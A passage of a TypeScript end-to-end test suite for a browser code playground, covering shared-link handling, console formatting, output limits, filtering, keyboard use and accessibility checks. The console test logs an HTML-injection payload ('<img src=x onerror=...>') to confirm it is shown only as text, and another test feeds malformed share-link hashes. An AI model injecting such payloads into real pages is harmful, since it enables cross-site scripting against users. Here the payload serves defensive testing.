        expect(await friend.evaluate(() => location.hash)).toBe('');
        expect(await friend.evaluate(() => (window as unknown as { __pg: { fromLink: boolean } }).__pg.fromLink)).toBe(false);
    });

    test('Discard drops a shared project and returns to your own', async () => {
        const sharer = await openPlayground(browser, base());
        await setCode(sharer, 'main.js', 'console.log("from the link");');
        await sleep(600);
        await sharer.click('#share');
        await sharer.waitForFunction(() => location.hash.startsWith('#p=v1.'));
        const hash = await sharer.evaluate(() => location.hash);

        // Someone who already has their own saved project opens the link.
        const mine = JSON.stringify({ project: { network: false, files: [{ name: 'index.html', code: '<p>mine</p>' }, { name: 'main.js', code: 'console.log("my own");' }] }, active: 'main.js' });
        const page = await openPlayground(browser, base(), { hash, waitForPreview: false, storage: { 'playground:v1': mine } });
        await page.waitForFunction(() => (window as unknown as { __pg: { fromLink: boolean } }).__pg.fromLink === true);
        await page.click('#discard-shared');
        await page.waitForFunction(() => (window as unknown as { __pg: { fromLink: boolean } }).__pg.fromLink === false);
        expect(await page.evaluate(() => location.hash)).toBe('');
        await waitForConsole(page, (e) => e.some((x) => x.text === 'my own'));
        expect(await text(page, '#message')).toMatch(/Discarded the shared project/);
    });

    test('a broken or hostile link falls back to your own project with a message, and never runs anything', async () => {
        for (const hash of ['#p=v1.AAAA', '#p=v1.!!!', '#p=garbage', `#p=v1.${'A'.repeat(300_000)}`]) {
            const page = await openPlayground(browser, base(), { hash, waitForPreview: true });
            expect(await text(page, '#message')).toMatch(/could not be read/);
            expect(await page.evaluate(() => (window as unknown as { __pg: { fromLink: boolean } }).__pg.fromLink)).toBe(false);
        }
    });
});

describe('the console', () => {
    test('values are formatted, groups indent, and markup is only ever text', async () => {
        const page = await openPlayground(browser, base());
        await edit(
            page,
            'main.js',
            `console.log({ a: 1, list: [1, 2, { deep: { deeper: { deepest: 1 } } }] }, new Map([['k', 1]]), 'text');
console.group('group');
console.log('inside');
console.groupEnd();
console.warn('careful');
console.log('<img src=x onerror=window.__pwned=1><b>bold</b>');
const circular = {}; circular.me = circular; console.log(circular);
console.log('%s has %d items', 'cart', 3);`,
        );
        const entries = await waitForConsole(page, (e) => e.some((x) => /cart has 3 items/.test(x.text)));
        const texts = entries.map((e) => e.text);
        expect(texts[0]).toBe(`{ a: 1, list: [ 1, 2, { deep: [Object] } ] } Map(1) { 'k' => 1 } text`);
        expect(texts).toContain('inside');
        expect(texts).toContain('<img src=x onerror=window.__pwned=1><b>bold</b>');
        expect(texts).toContain('{ me: [Circular] }');
        expect(await page.$$eval('#console-log img, #console-log b', (els) => els.length)).toBe(0);
        const indent = await page.$$eval('#console-log .entry', (rows) => rows.map((r) => (r as HTMLElement).style.getPropertyValue('--g')));
        expect(indent[2]).toBe('1'); // the group's title, then "inside" one level in
    });

    test('a flood of output is capped, says so, and the playground stays responsive', async () => {
        const page = await openPlayground(browser, base());
        await edit(page, 'main.js', `for (let i = 0; i < 20000; i++) console.log('line', i);`);
        const entries = await waitForConsole(page, (e) => e.some((x) => x.level === 'system'));
        expect(entries.length).toBeLessThanOrEqual(1001);
        expect(entries.at(-1)!.text).toMatch(/Console output limit reached/);
        await Promise.race([page.evaluate(() => 1), sleep(1500).then(() => Promise.reject(new Error('unresponsive')))]);
    });

    test('the filter hides plain logs, and Clear empties the console', async () => {
        const page = await openPlayground(browser, base());
        await edit(page, 'main.js', `console.log('plain'); console.warn('warned'); console.error('errored');`);
        await waitForConsole(page, (e) => e.length === 3);
        await page.select('#console-filter', 'error');
        const visible = await page.$$eval('#console-log .entry', (rows) => rows.filter((r) => getComputedStyle(r).display !== 'none').map((r) => r.querySelector('.msg')!.textContent));
        expect(visible).toEqual(['errored']);
        expect(await text(page, '#console-count')).toMatch(/1 error, 1 warning/);
        await page.click('#console-clear');
        expect(await consoleEntries(page)).toEqual([]);
    });
});

describe('keyboard, accessibility and small screens', () => {
    const violations = (page: Page) =>
        page.evaluate(axe.source).then(() =>
            page.evaluate(async () => {
                const result = await (window as unknown as { axe: { run(): Promise<{ violations: { id: string; help: string; nodes: { html: string }[] }[] }> } }).axe.run();
                return result.violations.map((v) => `${v.id}: ${v.help} (${v.nodes.map((n) => n.html.slice(0, 90)).join(' | ')})`);
            }),
        );

    test('Escape then Tab leaves the editor, and the skip link and splitter work from the keyboard', async () => {
        const page = await openPlayground(browser, base());
        await page.click('.cm-content');
        await page.keyboard.press('Escape');
        await page.keyboard.press('Tab');
        const focused = await page.evaluate(() => document.activeElement?.closest('.cm-editor') !== null);
        expect(focused).toBe(false);

        await page.focus('#splitter');
        const before = Number(await page.$eval('#splitter', (el) => el.getAttribute('aria-valuenow')));
        await page.keyboard.press('ArrowRight');
        expect(Number(await page.$eval('#splitter', (el) => el.getAttribute('aria-valuenow')))).toBe(before + 3);

        await page.keyboard.press('Tab');
        await page.reload();
        await page.waitForFunction(() => (window as unknown as { __pg?: unknown }).__pg !== undefined);
        await page.keyboard.press('Tab');
        expect(await page.evaluate(() => document.activeElement?.textContent)).toBe('Skip to the editor');
    });

    test.each(['light', 'dark'] as const)('axe finds nothing to fix in %s mode, with a failed build showing and the file form open', async (scheme) => {
        const page = await openPlayground(browser, base());
        await page.emulateMediaFeatures([{ name: 'prefers-color-scheme', value: scheme }]);
        await setCode(page, 'main.js', 'const = broken;');
        await waitForConsole(page, (e) => e.some((x) => x.level === 'error'));
        await page.click('button[aria-label="New file"]');
        await page.waitForSelector('.cm-lintRange-error');
        await sleep(200);
        expect(await violations(page)).toEqual([]);
    });

    test('the same on a phone, on every one of its three panes, with no sideways scroll at 360px', async () => {
        const page = await openPlayground(browser, base(), { width: 360, height: 740 });
        await setCode(page, 'main.js', 'console.log("hi"); console.error("oops");');
        await waitForConsole(page, (e) => e.length === 2);
        for (const pane of ['code', 'preview', 'console']) {
            await page.click(`#panes-nav [data-pane="${pane}"]`);
            expect(await page.evaluate(() => document.documentElement.scrollWidth), pane).toBeLessThanOrEqual(360);
            expect(await violations(page), pane).toEqual([]);
        }
        // Only the chosen pane is on screen.
        expect(await page.$eval('#pane-console', (el) => getComputedStyle(el).display)).not.toBe('none');
        expect(await page.$eval('.editor-pane', (el) => getComputedStyle(el).display)).toBe('none');
        expect(await page.$eval('#pane-preview', (el) => getComputedStyle(el).display)).toBe('none');
    });
});
